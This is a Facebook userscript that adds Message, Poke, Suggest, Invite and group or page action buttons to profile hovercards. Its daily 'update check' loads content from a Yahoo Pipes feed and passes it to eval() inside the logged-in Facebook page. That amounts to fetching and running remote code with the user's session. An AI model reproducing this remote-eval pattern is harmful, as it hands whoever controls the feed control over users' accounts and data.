(function () {
// ==UserScript==
// @name           FB Suggest Agogo
// @namespace      http://blog.krakenstein.net
// @author         daYOda (Krakenstein)
// @description    Facebook.com - Add friend Suggest, Poke & Friends Remover inside the Box!
// @version        2.6
// @include        https://*.facebook.com/*
// @match          https://*.facebook.com/*
// @include        http://*.facebook.com/*
// @match          http://*.facebook.com/*
// ==/UserScript==


function c1(q,root){return document.evaluate(q,root?root:document,null,9,null).singleNodeValue;}
function c2(_q,_el){
  var res=[];var el,els=document.evaluate(_q,_el?_el:document,null,XPathResult.UNORDERED_NODE_ITERATOR_TYPE,null);
  while (el=els.iterateNext())res.push(el);return res;
}
function g(id){if(id&&typeof id==='string'){id=document.getElementById(id);}return id||null;}
function regexx(s,rg){var rs;if(rs=s.match(rg)){return rs[1]?rs[1]:rs[0]||rs;}}

const yodUpdate = {
  script_id : 86545,
  script_version : '2.6',
  script_pipeId : '7015d15962d94b26823e801048aae95d',
}

function setValue(key, value) {
  localStorage.setItem(key, value);
  return false;
}

function getValue(key) {
  var val = localStorage.getItem(key);
  return val;
}

function usoUpdate(el) {
  const s_CheckUpdate = 'YodCheckUpdate' + yodUpdate['script_id'];
  const s_Redir = false;
  var md = parseInt(new Date().getDate());
  var CheckUpdate = parseInt(getValue(s_CheckUpdate));
  var NeedCheckUpdate = false;
  if (CheckUpdate !== md) {
    setValue(s_CheckUpdate, md);
    el = el ? el : document.body;
    if (el) {
      if (!document.getElementById(s_CheckUpdate)) {
        var s_gm = document.createElement('script');
        s_gm.id = s_CheckUpdate;
        s_gm.type = 'text/javascript';
        s_gm.innerHTML = 'function go' + s_CheckUpdate + '(itm){if(itm.value.items.length){return eval(unescape(itm.value.items[0].content).replace(/&lt;/g,\'<\').replace(/&gt;/g,\'>\').replace(/&amp;/g,\'&\'));}}';
        el.appendChild(s_gm);
      }
      var s_gm = document.createElement('script');
      s_gm.type = 'text/javascript';
      var sSrc = 'http://pipes.yahoo.com/pipes/pipe.run?_id=' + yodUpdate['script_pipeId'];
      sSrc += '&_render=json&_callback=go' + s_CheckUpdate;
      sSrc += '&id=' + yodUpdate['script_id'] + '&ver=' + yodUpdate['script_version'];
      if (s_Redir) sSrc += '&redir=yes';
      s_gm.src = sSrc;
      el.appendChild(s_gm);

      NeedCheckUpdate = true;
    }
  }
  else {
    setValue(s_CheckUpdate, md);
  }

  return NeedCheckUpdate;
}

function hasClass(el, cn) {
  return (el.className + " ").indexOf(cn) >= 0;
}

const gm_class = 'uiListItem  uiListHorizontalItemBorder uiListHorizontalItem';
const gm_class_ul = 'uiList uiListHorizontal clearfix';
const gm_class_div = 'pvs phm actions';// uiBoxGray
const gm_class_div_gray = gm_class_div + ' uiBoxGray';
const div_target_class = 'yodAgogo_div_target_class';
const gm_class_ul_new = 'yodAgogo_ul ' + gm_class_ul;
const dom = "DOMNodeInserted";
var t3, t2, t1; // timeout
var penetration = false; // first running
var HovercardBelow = false;

var spritemap = 'data:image/png;base64,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';

const mycss = "\
."+div_target_class+"{\
padding: 10px 0 0;\
margin-bottom: -5px;\
clear: both;\
color: gray;\
}\
.yodAgogo_ul{\
padding-top: 5px !important;\
}\
.yodAgogo_div{\
min-height: 20px!important;\
display: block!important;\
}\
.yod_i{\
background-image: url('"+spritemap+"');\
background-repeat: no-repeat;\
display: inline-block;\
height: 16px;\
width: 16px;\
}\
.yod_li_butt{\
padding-right:10px;\
}\
.yod_i_butt_f_msg{\
background-position: -128px top;\
}\
.yod_i_butt_f_suggest{\
background-position: 0px top;\
}\
.yod_i_butt_f_share{\
background-position: -16px top;\
}\
.yod_i_butt_f_poke{\
background-position: -32px top;\
}\
.yod_i_butt_f_remove{\
background-position: -48px top;\
}\
.yod_i_butt_g_joinleave{\
background-position: -80px top;\
}\
.yod_i_butt_g_addto{\
background-position: -112px top;\
}\
.yod_i_butt_p_unlike{\
background-position: -96px top;\
}\
.yod_i_butt_p_suggest{\
background-position: -16px top;\
}\
.yod_i_butt_p_addtofav{\
background-position: -64px top;\
}\
.yod_i_butt_e_suggest{\
background-position: -144px top;\
}\
.yod_i_butt_e_action{\
background-position: -160px top;\
}\
.a_yod_sub{\
margin-left: 15px !important;\
}\
";

function add_style(css) {
  var chrome = /Chrome/.test(navigator.userAgent);
  if (chrome) css = css.replace(/\-moz\-/ig, '');
  if (typeof GM_addStyle !== 'undefined') {
    return GM_addStyle(css);
  }
  else if (heads = document.getElementsByTagName('head')) {
    var style = document.createElement('style');
    try { style.innerHTML = css; }
    catch(x) { style.innerText = css; }
    style.type = 'text/css';
    heads[0].appendChild(style);
  }
}

function checkthebox(box) {
  return c1('.//ul[contains(@class,"' + gm_class_ul + '")]', box);
}
/**/

var flooded=0;
function removeFlooder(floods) {
  if (floods.length > 1) {
    for (i=1; i<floods.length; i++) {
      floods[i].parentNode.removeChild(floods[i]);
    }
    flooded++;
  }
  //alert("flooded!");
}

function getIDfromImg(box) {
  var img, id;
  if (img = c1('.//div[contains(@class,"uiProfilePhotoHuge")]/img[contains(@class,"img")]', box)) {
    // from photo profile
    //groupId = regexx(img.style.backgroundImage, /\d{7,}/);
    id = regexx(img.src, /\d{7,}/);
  }
  return id;
}

function checkPage(box) {
  var fb_isnotfan, fbpageUrl, fbpageId, is_fbpage;
  if (is_fbpage = regexx(box.innerHTML, />(,|\d+)*.?like this\.?/)) {
  //if (fbpageUrl = c1('.//td/a[contains(@href,"facebook.com/pages/")]', box)) {
    if (fb_isnotfan = c1('.//a[contains(@ajaxify,"&add=1&")]', box)) {
      // inner Ajax
      fbpageId = regexx(fb_isnotfan.getAttribute('ajaxify'), /fbpage_id=(\d+)&/);
    } else {

      if (fbpageUrl = c1('.//a[contains(@href,"facebook.com/pages/")]', box)) {
        //page URL
        fbpageId = regexx(fbpageUrl.href, /\/(\d+)$/);
      }/*
      else if (fbpageUrl = c1('.//a/img[contains(@class,"mrm photo img")]', box)) {
        // from photo profile
        fbpageId = regexx(fbpageUrl.style.backgroundImage, /\d{7,}/);
      }

      if (!(fbpageId = regexx(fbpageUrl.href, /\/(\d+)$/))) {}*/
      else {
        // from photo profile
        fbpageId = getIDfromImg(box);
      }
    }
  }
  return fbpageId;
}

function checkGroup(box) {
  var groupId = regexx(box.innerHTML, /\/groups\/(\d+)\//);
  if (!groupId) groupId = regexx(box.innerHTML, /group_id=(\d+)/);
  if (!groupId && regexx(box.innerHTML, /href="\/groups\//)) {
    groupId = getIDfromImg(box);
  }
  return groupId;
}

function checkEvent(box) {
  return regexx(box.innerHTML, /\/event\.php\?eid=(\d+)/);
}

function doInject(box) {
  var dummy, is_fbpage, fbpageUrl, fbpageId, fb_isnotfan, groupId, groupId_ismember,
      fb_id, div, ul, ul_new, target, str = '';

  if (t3) clearTimeout(t3);

  //removeFlooder(c2('.//div[contains(@class,"' + div_target_class + '")]', box));
  //removeFlooder(c2('.//ul[contains(@class,"' + gm_class_ul_new + '")]', box));
  //if (flooded) return;

  //if (!(div = c1('.//div[contains(@class,"' + gm_class_div + '")]', box))) {
  if (!(div = c1('.//div[contains(@class,"' + gm_class_div + '")]'))) {
    if (divHovercardBelow = c1('.//div[contains(@class,"HovercardOverlay")]/div')) {
      HovercardBelow = regexx(divHovercardBelow.className, /(\s?HovercardBelow+)/);
    }

    // Check if PAGE --
    if (fbpageId = checkPage(box)) {
      // yes, it's Page
    }

    // Check if GROUP --
    else if (groupId = checkGroup(box)) {
      // yes, it's Group
    }

    // Check if GROUP --
    else if (eventId = checkEvent(box)) {
      // yes, it's Group
    }

    // Or Die carefully --
    else return;

    if (fbpageId || groupId || eventId) {
      var stage = c1('.//div[contains(@class,"stage")]', box);
      if (stage && stage.firstChild) {

        // Create faked place to inject --

        if (fbpageId) { // Check if PAGE --

          str = '<div class="' + gm_class_div_gray +'"><ul class="' + gm_class_ul +'">'
            + '<li class="' + gm_class +'"><!--fan_status.php?fbpage_id=' + fbpageId + '--></li>'
            + '</ul></div>';

        } else if (groupId) { // Check if GROUP --

          str = '<div class="' + gm_class_div_gray +'">'
            + '<ul class="' + gm_class_ul +'">'
            + '<li class="' + gm_class +'"><!--/groups/' + groupId + '/--></li>'
            + '</ul></div>';

        } else if (eventId) { // Check if GROUP --

          str = '<div class="' + gm_class_div_gray +'">'
            + '<ul class="' + gm_class_ul +'">'
            + '<li class="' + gm_class +'"><!--/event.php?eid=' + eventId + '/--></li>'
            + '</ul></div>';

        }

        else return; // Or Die carefully --

        stage.innerHTML = '<div data-hovercard-layout="HovercardWithFooter">'+stage.innerHTML+str+'</div>';
        box.firstChild.className = 'hovercard HovercardWithFooter';
        // and return as NORMAL Way
        return doInject(box);
      }
    } else return; // Or Die carefully --
  }

  // Fail to inject --
  if (!(ul = checkthebox(div)) && box) return;
  else {
    // Die if no place to inject --
    //if (!(target = c1('.//li[contains(@class,"' + gm_class + '")]', ul))) return;
    if (!(target = c1('.//li[contains(@class,"uiListHorizontalItem")]', ul))) return;
    fbpageId = regexx(target.innerHTML, /fan_status\.php\?fbpage_id=(\d+)/);
    groupId = checkGroup(box);
    eventId = regexx(target.innerHTML, /\/event\.php\?eid=(\d+)\//);

    if (!(c1('.//ul[contains(@class,"' + gm_class_ul_new + '")]', box)) && target) {
      if (divHovercardBelow = c1('.//div[contains(@class,"HovercardOverlay")]/div')) {
        if (HovercardBelow) divHovercardBelow.className += ' HovercardBelow';
        else divHovercardBelow.className.replace(/(\s?HovercardBelow+)/, '');
      }
      HovercardBelow = false;

      var currId;

      if (currId = fbpageId) {
        // Pages --

        fb_isnotfan = c1('.//a[contains(@ajaxify,"&add=1&")]', target);

        target.innerHTML += fb_isnotfan ? '' :
         '<span id="span_yod_' + fbpageId + '">'
          + '<a class="action actionspro_a" title="Unlike this" href="#" '
          + 'rel="async-post" ajaxify="/ajax/pages/fan_status.php?'
          + 'fbpage_id=' + fbpageId + '&add=0&reload=0&preserve_tab=0&use_primer=1&source=hovercard'
          + '&span_id=span_yod_' + fbpageId + '">'
          + '<i class="mrs img yod_i yod_i_butt_p_unlike"></i>'
          + 'Unlike this</a></span>';

        // Suggest be Fans of Page --
        str += '<li class="yod_li_butt ' + gm_class + '">'
          + '<a title="Invite Friends (Admin only)" class="action actionspro_a" '
          + 'ajaxify="/ajax/choose/?type=fan_page&page_id=' + fbpageId + '" href="#" rel="dialog-post">'
          + '<i class="mrs img yod_i yod_i_butt_p_addtofav"></i>'
          + 'Invite</a>'
          //+ '</li>';

        // Share Page --
        //str += '<li class="yod_li_butt ' + gm_class + '">'
          + '<a title="Share Page" class="action actionspro_a a_yod_sub" '
          + 'href="/ajax/sharer/?s=18&appid=2530096808&p[]=' + fbpageId + '" rel="dialog">'
          //+ '<i class="mrs img yod_i yod_i_butt_f_share"></i>'
          + 'Share</a>'
          //+ '</li>';

        // Add to My Page's Favorites --
        //str += '<li class="yod_li_butt ' + gm_class + '">'
          + '<a title="Add to My Page\'s Favorites" class="action actionspro_a a_yod_sub" '
          + 'href="/ajax/pages/favorite_status.php?fbpage_id=' + fbpageId + '&add=1" rel="dialog-post">'
          //+ '<i class="mrs img yod_i yod_i_butt_p_addtofav"></i>'
          + '+ Fav</a>'
          //+ '</li>';

        // Remove from My Page's Favorites --
        //str += '<li class="yod_li_butt ' + gm_class + '">'
          + '<a title="Remove from My Page\'s Favorites" class="action actionspro_a a_yod_sub" '
          + 'href="/ajax/pages/favorite_status.php?fbpage_id=' + fbpageId + '&add=0" rel="dialog-post">'
          //+ '<i class="mrs img yod_i yod_i_butt_p_addtofav"></i>'
          + '- Fav</a>'
          //+ '</li>';
/*
        // Report Page --
        //str += '<li class="yod_li_butt ' + gm_class + '">'
          + '<a title="Report Page" class="action actionspro_a a_yod_sub" '
          + 'href="/ajax/report.php?content_type=23&cid=' + fbpageId + '&h=AfjtzC9zw6T635P7" rel="dialog">'
          //+ '<i class="mrs img yod_i yod_i_butt_p_addtofav"></i>'
          + 'Report</a>'
          //+ '</li>';
*/
        // Subscribe RSS --
        //str += '<li class="yod_li_butt ' + gm_class + '">'
          + '<a title="Subscribe RSS" class="action actionspro_a a_yod_sub" '
          + 'href="http://www.facebook.com/feeds/page.php?id=' + fbpageId + '&format=rss20" target="_blank">'
          //+ '<i class="mrs img yod_i yod_i_butt_p_addtofav"></i>'
          + 'RSS</a>'
          + '</li>';

      } else if (currId = groupId) {
        // Groups --
        // So, we are new friend? --
        //var newgroup = regexx(target.innerHTML, /\/ajax\/groups\/confirm_join_dialog\.php\?gid=(\d+)/);
        var newgroup = regexx(target.parentNode.innerHTML, /\/ajax\/groups\/membership\/r2j\.php\?group_id=(\d+)/);

        //var gname = c1('.//div[contains(@class,"fsl")]/a[contains(@href,"/group.php?gid=")]', box);
        //var gname = c1('.//div[contains(@class,"fsl")]/a[contains(@href,"/groups/")]', box);
        //gname = gname ? gname.textContent.trim() : 'This Group';

        // Join, Leave Group --
        str += '<li class="yod_li_butt ' + gm_class + '">';
        if (newgroup) {
          str += '<a title="Join Group" class="action actionspro_a" '
            + 'href="#" ajaxify="/ajax/groups/confirm_join_dialog.php?gid=' + groupId + '" rel="dialog">';
        } else {
          str += '<a title="Leave Group" class="action actionspro_a" '
            + 'href="/ajax/groups/membership/leave.php?group_id=' + groupId + '" rel="dialog-post">';
        }
        str += '<i class="mrs img yod_i yod_i_butt_g_joinleave"></i>';
        if (newgroup) {
          str += 'Join Group';
        } else {
          str += 'Leave Group';
        }
        str += '</a></li>';
/**/
        // Add Friends to Group --
        str += '<li class="yod_li_butt ' + gm_class + '">'
          + '<a title="Add Friends to Group" class="action actionspro_a" '
          + 'href="/ajax/groups/members/add_get.php?group_id=' + groupId + '" rel="dialog">'
          + '<i class="mrs img yod_i yod_i_butt_g_addto"></i>'
          + 'Add Friends to Group</a>'
          + '</li>';

      } else if (currId = eventId) {
        // Event --
        // Invite Friend? --

        // Select Friends to Invite --
        str += '<li class="yod_li_butt ' + gm_class + '">'
          + '<a title="Select Friends to Invite" class="action actionspro_a" '
          + 'href="/events/create/?eid=' + eventId + '" rel="dialog-post" ajaxify="/ajax/choose/?type=event&eid=' + eventId + '&send_invites_on_close=1">'
          + '<i class="mrs img yod_i yod_i_butt_e_suggest"></i>'
          + 'Invite</a>'
          + '</li>';

        // Change action --
        str += '<li class="yod_li_butt ' + gm_class + '">'
          + '<a title="Change Action to this Event" class="action actionspro_a" '
          + 'href="/ajax/events/rsvp.php?eid=' + eventId + '&inline&allow_removal" rel="dialog">'
          + '<i class="mrs img yod_i yod_i_butt_e_action"></i>'
          + 'Actions</a>'
          + '</li>';

        // Share Event --
        str += '<li class="yod_li_butt ' + gm_class + '">'
          + '<a title="Share this Event" class="action actionspro_a" '
          + 'href="/ajax/sharer/?s=7&appid=2344061033&p[]=' + eventId + '" rel="dialog">'
          + '<i class="mrs img yod_i yod_i_butt_f_share"></i>'
          + 'Share</a>'
          + '</li>';

      } else {
        // Persons --

        // Die if no FB Id --
        //if (!(fb_id = regexx(target.innerHTML, /id=(\d+)/))) return;
        if (!(fb_id = regexx(target.innerHTML, /data-profileid="(\d+)"/))) return;
        currId = fb_id;
        // So, we are new friend? --
        var newfiend = regexx(target.innerHTML, /connect\.php\?profile_id=(\d+)/);

        // Messaging --
        str += '<li class="yod_li_butt ' + gm_class + '">'
          + '<a title="Message this Person" class="action actionspro_a" '
          + 'href="/ajax/messaging/composer.php?id=' + fb_id + '" rel="dialog-post">'
          + '<i class="mrs img yod_i yod_i_butt_f_msg"></i>'
          + 'Message</a>'
          + '</li>';

        // Suggest Friends --
        str += '<li class="yod_li_butt ' + gm_class + '">'
          + '<a title="Suggest to Friends" class="action actionspro_a" '
          + 'href="/ajax/friend_suggester_dialog.php?newcomer=' + fb_id + ''
          + '&close_handler=null&ref=profile_others" rel="async">'
          + '<i class="mrs img yod_i yod_i_butt_f_suggest"></i>'
          + 'Suggest to</a>'
          + '</li>';
/**
        // Share Friends --
        str += '<li class="yod_li_butt ' + gm_class + '">'
          + '<a title="Share to friends / post to profile" class="action actionspro_a" '
          + 'href="/ajax/share_dialog.php?s=1&appid=2327158227&p[]=' + fb_id +'" rel="dialog">'
          + '<i class="mrs img yod_i yod_i_butt_f_share"></i>'
          + 'Share</a>'
          + '</li>';
**/
        // Poke Friends --
        str += '<li class="yod_li_butt ' + gm_class + '">'
          + '<a title="Poke this Person" class="action actionspro_a" '
          + 'href="/ajax/poke_dialog.php?uid=' + fb_id + '&pokeback=0" rel="dialog-post">'
          + '<i class="mrs img yod_i yod_i_butt_f_poke"></i>'
          + 'Poke</a>'
          + '</li>';
/**
        if (!newfiend) {
          // Remove Friends --
          str += '<li class="' + gm_class + '">'
            + '<a title="Remove this Person" class="action actionspro_a" '
            + 'href="/ajax/profile/removefriendconfirm.php?uid=' + fb_id + '&pokeback=0" rel="dialog-post">'
            + '<i class="mrs img yod_i yod_i_butt_f_remove"></i>'
            + 'Remove</a>'
            + '</li>';

        }
**/
      }

      if (currId) {
        var div_target = document.createElement('div');
        //div_target.setAttribute('style', 'padding: 10px 0 0; margin-bottom: -5px; clear: both; color: gray;');
        div_target.innerHTML = 'Target Id: ' + currId;
        div_target.innerHTML += '<div style="float:right;display:inline;"><a href="http://userscripts.org/scripts/discuss/' + yodUpdate['script_id'] + '" target="_blank" title="Report script bugs, thanks!">Report bugs</a></div>';
        div_target.className = div_target_class;
        div.parentNode.insertBefore(div_target, div);
        //div.setAttribute('style', 'min-height: 20px!important;display: block!important;');
        div.className += ' yodAgogo_div';
      }

      ul_new = document.createElement('ul');
      ul_new.className = gm_class_ul_new;
      //ul_new.setAttribute('style', 'padding-top: 5px !important;');
      ul_new.innerHTML = str;
      div.appendChild(ul_new);
    }
  }
}

function bindbox(box) {
  if (t2) clearTimeout(t2);
  if (!penetration) content.removeEventListener(dom, doListen, false);
  if (box) {
    penetration = true;
    if (box.currentTarget) {
      box = box.currentTarget;
    }
    if(div = g('hovercardPreload')) {
      div.innerHTML="";
    }
    t3 = setTimeout(function() { doInject(box); }, 10);
  }
}

function findbox(ev) {
  if (/DIV/.test(ev.target.tagName) && /HovercardOverlay/.test(ev.target.className)) {
    var HovercardOverlay = ev.target;
    HovercardOverlay.addEventListener(dom, bindbox, false);
    if (!penetration) bindbox(HovercardOverlay);
  }
}

function doListen(ev) {
  t2 = setTimeout(function() { findbox(ev); }, 10);
}

function starter() {
  //content = g('content');
  content = document.body;
  if (content) {
    if (t1) clearTimeout(t1);
    content.addEventListener(dom, doListen, false);
    usoUpdate();
  }
  return false;
}

function Boot() {
  add_style(mycss);
  t1 = setTimeout(starter, 3000);
}

Boot();
})();